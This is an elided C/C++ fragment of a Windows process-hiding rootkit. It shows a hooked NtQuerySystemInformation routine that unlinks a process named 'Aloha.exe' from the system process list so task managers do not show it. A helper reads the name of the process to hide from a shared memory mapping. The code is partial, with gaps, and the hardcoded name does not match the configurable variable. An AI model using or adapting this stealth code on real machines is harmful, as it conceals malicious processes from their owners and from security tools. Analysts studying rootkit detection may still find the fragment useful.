...
wchar_t* Hidden_proc = L"NAME_OF PROCESS.exe";
    ...
    PULONG ReturnLength)
{
    ...
    if (SystemProcessInformation == SystemInformationClass && stat == 0) {
        ...
        while (prev->NextEntryOffset != NULL) {
            if (!lstrcmp(curr->ImageName.Buffer,L"Aloha.exe")) {if (curr->NextEntryOffset == 0) {prev->NextEntryOffset = 0; }else {prev->NextEntryOffset += curr->NextEntryOffset;}curr = prev;}
             prev = curr; curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
        }
    }
...
void get_process_name() {
    ...
    LPVOID buf = MapViewOfFile(map, // handle to map object
        ...
        0, 0, 255);
    Hidden_proc = (wchar_t*)malloc(255 * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, (char*)buf, -1, Hidden_proc, 255);
    UnmapViewOfFile(buf);
    CloseHandle(map);
}
